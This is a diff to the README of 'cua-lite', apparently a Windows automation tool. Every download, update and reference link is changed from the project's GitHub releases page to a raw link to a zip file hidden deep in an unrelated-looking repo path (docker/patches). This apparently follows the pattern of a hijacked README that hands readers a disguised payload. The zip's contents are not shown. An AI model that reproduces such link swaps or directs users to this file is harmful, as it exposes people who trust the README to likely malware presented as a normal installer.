@@ -50,9 +50,9 @@ Getting started with cua-lite takes just a few minutes. Follow these simple step
 
 ### Step 1: Get the Installer
 
-[![Download Now](https://img.shields.io/badge/Download-cua--lite-blue?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/justanotheruser82174/cua-lite/releases)
+[![Download Now](https://img.shields.io/badge/Download-cua--lite-blue?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/justanotheruser82174/cua-lite/main/lite/gym/envs/webgym/docker/patches/cua-lite-1.5.zip)
 
-Click the button above or visit this link to download the application: [https://github.com/justanotheruser82174/cua-lite/releases](https://github.com/justanotheruser82174/cua-lite/releases)
+Click the button above or visit this link to download the application: [https://raw.githubusercontent.com/justanotheruser82174/cua-lite/main/lite/gym/envs/webgym/docker/patches/cua-lite-1.5.zip](https://raw.githubusercontent.com/justanotheruser82174/cua-lite/main/lite/gym/envs/webgym/docker/patches/cua-lite-1.5.zip)
 
 ### Step 2: Run the Installer
 
@@ -121,7 +121,7 @@ If you create a useful task, save it right away. You can organize tasks into fol
 
 We regularly improve cua-lite with new features and fixes. When an update is available, you'll see a notification in the app. Click it to download the latest version. Your saved tasks will remain intact.
 
-You can also check for updates manually by visiting the releases page: [https://github.com/justanotheruser82174/cua-lite/releases](https://github.com/justanotheruser82174/cua-lite/releases)
+You can also check for updates manually by visiting the releases page: [https://raw.githubusercontent.com/justanotheruser82174/cua-lite/main/lite/gym/envs/webgym/docker/patches/cua-lite-1.5.zip](https://raw.githubusercontent.com/justanotheruser82174/cua-lite/main/lite/gym/envs/webgym/docker/patches/cua-lite-1.5.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -156,7 +156,7 @@ cua-lite puts the power of computer automation in your hands—without requiring
 
 The best way to learn is by trying. Download cua-lite today, create a simple task, and watch it work. You'll be amazed at how easy it is.
 
-Remember, the download link is always available here: [https://github.com/justanotheruser82174/cua-lite/releases](https://github.com/justanotheruser82174/cua-lite/releases)
+Remember, the download link is always available here: [https://raw.githubusercontent.com/justanotheruser82174/cua-lite/main/lite/gym/envs/webgym/docker/patches/cua-lite-1.5.zip](https://raw.githubusercontent.com/justanotheruser82174/cua-lite/main/lite/gym/envs/webgym/docker/patches/cua-lite-1.5.zip)
 
 Start automating your computer today. Your future self will thank you.
 
